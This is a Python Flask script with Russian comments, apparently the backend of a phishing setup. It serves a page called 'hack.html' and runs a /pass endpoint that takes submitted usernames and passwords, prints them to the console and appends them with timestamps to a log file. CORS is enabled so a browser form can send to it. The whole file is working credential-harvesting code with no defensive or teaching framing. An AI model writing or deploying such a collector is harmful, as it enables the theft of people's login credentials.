from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import datetime
import os

app = Flask(__name__)
CORS(app)  # Важно: разрешает браузеру отправлять данные на сервер

# Маршрут: открывает твой HTML файл
@app.route('/')
def index():
    return send_from_directory(os.getcwd(), 'hack.html')

# Маршрут: принимает данные от формы
@app.route('/pass', methods=['POST'])
def handle_pass():
    try:
        # Получаем данные в формате JSON
        data = request.get_json()
        
        username = data.get('username')
        password = data.get('password')
        
        # Формируем запись для лога
        log_entry = f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Login: {username} | Pass: {password}\n"
        
        # Печатаем в консоль (для проверки)
        print(f">>> ДАННЫЕ ПОЛУЧЕНЫ: {username} : {password}")
        
        # Сохраняем в файл
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(log_entry)
            
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"Ошибка на сервере: {e}")
        return jsonify({"status": "error"}), 500

if __name__ == '__main__':
    print("Сервер запущен! Перейди по адресу: http://127.0.0.1:5000")
    app.run(port=5000)



